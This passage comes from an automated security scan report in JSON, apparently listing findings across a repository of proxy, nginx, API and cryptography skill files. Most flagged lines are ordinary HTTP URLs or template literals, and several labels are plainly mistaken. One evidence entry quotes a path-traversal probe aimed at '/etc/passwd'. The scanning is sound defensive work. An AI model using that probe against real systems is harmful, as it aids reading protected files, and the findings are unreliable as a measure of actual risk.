      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://websocket_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 546,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 561,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/reverse-proxy.md",
      "line_number": 608,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 100,
      "issue": "Unencrypted HTTP",
      "evidence": "'http://api.example.com/data',",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 102,
      "issue": "Unencrypted HTTP",
      "evidence": "'http': 'http://user:pass@proxy.corp.com:8080',",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 103,
      "issue": "Unencrypted HTTP",
      "evidence": "'https': 'http://user:pass@proxy.corp.com:8080'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 114,
      "issue": "Unencrypted HTTP",
      "evidence": "'http': f'http://{os.environ[\"PROXY_HOST\"]}:{os.environ[\"PROXY_PORT\"]}',",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 115,
      "issue": "Unencrypted HTTP",
      "evidence": "'https': f'http://{os.environ[\"PROXY_HOST\"]}:{os.environ[\"PROXY_PORT\"]}'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 121,
      "issue": "Unencrypted HTTP",
      "evidence": "'http://api.example.com/data',",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 145,
      "issue": "Unencrypted HTTP",
      "evidence": "response = requests.get('http://api.example.com/data', proxies=proxies)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 158,
      "issue": "Unencrypted HTTP",
      "evidence": "response = requests.get('http://api.example.com/data', proxies=proxies)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 412,
      "issue": "Unencrypted HTTP",
      "evidence": "export http_proxy=\"http://proxy.example.com:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 413,
      "issue": "Unencrypted HTTP",
      "evidence": "export https_proxy=\"http://proxy.example.com:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 417,
      "issue": "Unencrypted HTTP",
      "evidence": "export http_proxy=\"http://user:pass@proxy.example.com:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 418,
      "issue": "Unencrypted HTTP",
      "evidence": "export https_proxy=\"http://user:pass@proxy.example.com:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 428,
      "issue": "Unencrypted HTTP",
      "evidence": "git config --global http.proxy http://proxy.example.com:8080",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 429,
      "issue": "Unencrypted HTTP",
      "evidence": "git config --global https.proxy http://proxy.example.com:8080",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 447,
      "issue": "Unencrypted HTTP",
      "evidence": "\"httpProxy\": \"http://proxy.example.com:8080\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 448,
      "issue": "Unencrypted HTTP",
      "evidence": "\"httpsProxy\": \"http://proxy.example.com:8080\",",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 510,
      "issue": "Unencrypted HTTP",
      "evidence": "'http://httpbin.org/ip',",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 518,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy = \"http://proxy.example.com:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "HIGH",
      "category": "Hardcoded Secret",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 544,
      "issue": "Possible hardcoded password",
      "evidence": "password = \"p@ss:word\"  # Example - use actual credentials from environment",
      "recommendation": "Use environment variables or secret management"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 546,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy = f\"http://{quote(username)}:{quote(password)}@proxy.example.com:8080\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 563,
      "issue": "Unencrypted HTTP",
      "evidence": "proxies={'https': 'http://proxy.example.com:8080'},",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 584,
      "issue": "Unencrypted HTTP",
      "evidence": "session.mount('http://', adapter)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 588,
      "issue": "Unencrypted HTTP",
      "evidence": "'http': 'http://proxy.example.com:8080',",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/forward-proxy.md",
      "line_number": 589,
      "issue": "Unencrypted HTTP",
      "evidence": "'https': 'http://proxy.example.com:8080'",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nats-messaging.md",
      "line_number": 64,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.post('http://service-b/webhook', json=event)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nats-messaging.md",
      "line_number": 65,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.post('http://service-c/webhook', json=event)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nats-messaging.md",
      "line_number": 66,
      "issue": "Unencrypted HTTP",
      "evidence": "requests.post('http://service-d/webhook', json=event)",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 718,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 838,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://api_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 852,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 887,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 908,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend_v1;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 913,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend_v2;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 917,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend_default;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 941,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1054,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1122,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1128,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1133,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend/v1/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1141,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://$backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1149,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1178,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1199,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1222,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://streaming_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1231,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1257,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1262,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_redirect http://backend/ http://$host/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1461,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1500,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1660,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://admin_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1840,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 1930,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://$backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2147,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2152,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://auth_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2216,
      "issue": "Path traversal pattern",
      "evidence": "\u2502   \u251c\u2500\u2500 example.com.conf -> ../sites-available/example.com.conf",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2217,
      "issue": "Path traversal pattern",
      "evidence": "\u2502   \u2514\u2500\u2500 api.example.com.conf -> ../sites-available/api.example.com.conf",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2271,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2345,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2353,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2364,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2369,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2378,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2383,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2416,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2443,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://$backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2450,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://$backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2470,
      "issue": "Unencrypted HTTP",
      "evidence": "curl http://backend:8080/",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2535,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://websocket_backend;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2719,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://api_v1/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2779,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://auth_service/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2787,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://user_service/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
      "line_number": 2795,
      "issue": "Unencrypted HTTP",
      "evidence": "proxy_pass http://order_service/;",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "CRITICAL",
      "category": "Command Injection Risk",
      "file": "skills/api/api-rate-limiting/resources/examples/python/fastapi-limiter.py",
      "line_number": 126,
      "issue": "eval() usage",
      "evidence": "result = await redis_client.eval(",
      "recommendation": "Never use eval() with user input"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
      "line_number": 449,
      "issue": "Backtick command execution",
      "evidence": "const url = `${this.baseUrl}${path}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
      "line_number": 453,
      "issue": "Backtick command execution",
      "evidence": "headers['Authorization'] = `Bearer ${this.apiKey}`;",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
      "line_number": 467,
      "issue": "Backtick command execution",
      "evidence": "throw new Error(`HTTP ${response.status}: ${response.statusText}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
      "line_number": 526,
      "issue": "Backtick command execution",
      "evidence": "code += '    if (params.toString()) path += `?${params.toString()}`;\\n'",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/protobuf-schemas/resources/scripts/validate_proto_schemas.py",
      "line_number": 666,
      "issue": "Path traversal pattern",
      "evidence": "suggestion=f\"Add 'option {option} = \\\"...\\\";'\"",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/protocols/resources/amqp-rabbitmq/scripts/analyze_message_flow.py",
      "line_number": 656,
      "issue": "Unencrypted HTTP",
      "evidence": "management_url = f\"http://{host}:15672\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/protocols/resources/amqp-rabbitmq/scripts/validate_rabbitmq_config.py",
      "line_number": 654,
      "issue": "Unencrypted HTTP",
      "evidence": "management_url = f\"http://{host}:15672\"",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/grpc-implementation/resources/examples/python/server.py",
      "line_number": 23,
      "issue": "Path traversal pattern",
      "evidence": "# python -m grpc_tools.protoc -I../protos --python_out=. --grpc_python_out=. ../protos/service.proto",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/protocols/grpc-implementation/resources/examples/python/client.py",
      "line_number": 17,
      "issue": "Path traversal pattern",
      "evidence": "# python -m grpc_tools.protoc -I../protos --python_out=. --grpc_python_out=. ../protos/service.proto",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/03-yubihsm-setup.py",
      "line_number": 43,
      "issue": "Privilege escalation",
      "evidence": "print(\"\\nStart connector with: sudo systemctl start yubihsm-connector\", file=sys.stderr)",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/02-aws-cloudhsm-integration.py",
      "line_number": 289,
      "issue": "Privilege escalation",
      "evidence": "print(\"2. Install: sudo yum install -y ./cloudhsm-client-*.rpm\", file=sys.stderr)",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/resources/hsm-integration/examples/02-aws-cloudhsm-integration.py",
      "line_number": 290,
      "issue": "Privilege escalation",
      "evidence": "print(\"3. Configure: sudo /opt/cloudhsm/bin/configure -a <cluster-ip>\", file=sys.stderr)",
      "recommendation": "Document why sudo is needed and alternatives"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/examples/python/mtls_server_client.py",
      "line_number": 173,
      "issue": "shell=True in subprocess",
      "evidence": "# SECURITY: Commands are hardcoded strings (no user input) - safe to use shell=True",
      "recommendation": "Use shell=False and pass command as list"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/examples/python/mtls_server_client.py",
      "line_number": 175,
      "issue": "shell=True in subprocess",
      "evidence": "subprocess.run(cmd, shell=True, check=True)",
      "recommendation": "Use shell=False and pass command as list"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/certificate-management/resources/examples/python/acme_automation.py",
      "line_number": 195,
      "issue": "Unencrypted HTTP",
      "evidence": "print(f\"Make sure this is accessible at: http://{domain}/.well-known/acme-challenge/{challenge.token}\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management/resources/scripts/renew_certificates.py",
      "line_number": 275,
      "issue": "Force flag usage",
      "evidence": "cmd.append('--force-renewal')",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "HIGH",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/renew_certificates.py",
      "line_number": 333,
      "issue": "shell=True in subprocess",
      "evidence": "shell=True,",
      "recommendation": "Use shell=False and pass command as list"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
      "line_number": 26,
      "issue": "Unencrypted HTTP",
      "evidence": "- Sectigo: http://timestamp.sectigo.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
      "line_number": 410,
      "issue": "Unencrypted HTTP",
      "evidence": "print(\"  \u2022 Sectigo: http://timestamp.sectigo.com\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
      "line_number": 411,
      "issue": "Unencrypted HTTP",
      "evidence": "print(\"  \u2022 GlobalSign: http://timestamp.globalsign.com/tsa/r6advanced1\")",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/signing-verification/resources/examples/hsm-pkcs11-signing.py",
      "line_number": 69,
      "issue": "User-controlled file path",
      "evidence": "self.session = self.token.open(user_pin=pin)",
      "recommendation": "Validate path is within allowed directory"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/scripts/sign_artifacts.py",
      "line_number": 24,
      "issue": "Unencrypted HTTP",
      "evidence": "sign_artifacts.py --file code.tar.gz --key key.pem --timestamp http://tsa.example.com",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/signing-verification/resources/scripts/sign_artifacts.py",
      "line_number": 141,
      "issue": "User-controlled file path",
      "evidence": "self.pkcs11_session = slot.open(user_pin=self.hsm_pin)",
      "recommendation": "Validate path is within allowed directory"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/cryptography/signing-verification/resources/scripts/validate_signatures.py",
      "line_number": 359,
      "issue": "Unencrypted HTTP",
      "evidence": "ns = {'ds': 'http://www.w3.org/2000/09/xmldsig#'}",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/cryptography/signing-verification/resources/scripts/audit_signing_keys.py",
      "line_number": 629,
      "issue": "User-controlled file path",
      "evidence": "session = slot.open(user_pin=pin)",
      "recommendation": "Validate path is within allowed directory"
    },
    {
      "severity": "HIGH",
      "category": "SQL Injection Risk",
      "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
      "line_number": 146,
      "issue": "Possible SQL injection via f-string",
      "evidence": "cursor.execute(f\"DROP USER IF EXISTS {secondary_user}\")",
      "recommendation": "Use parameterized queries"
    },
    {
      "severity": "HIGH",
      "category": "SQL Injection Risk",
      "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
      "line_number": 177,
      "issue": "Possible SQL injection via f-string",
      "evidence": "cursor.execute(f\"GRANT {role} TO {secondary_user}\")",
      "recommendation": "Use parameterized queries"
    },
    {
      "severity": "HIGH",
      "category": "SQL Injection Risk",
      "file": "skills/cryptography/secrets-rotation/resources/examples/04_postgresql_zero_downtime_rotation.py",
      "line_number": 195,
      "issue": "Possible SQL injection via f-string",
      "evidence": "cursor.execute(f\"DROP USER IF EXISTS {username}\")",
      "recommendation": "Use parameterized queries"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
      "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
      "line_number": 78,
      "issue": "Path traversal pattern",
      "evidence": "\"../../../etc/passwd\",",
      "recommendation": "Validate and sanitize file paths"
    },
    {
      "severity": "MEDIUM",
      "category": "Path Traversal Risk",
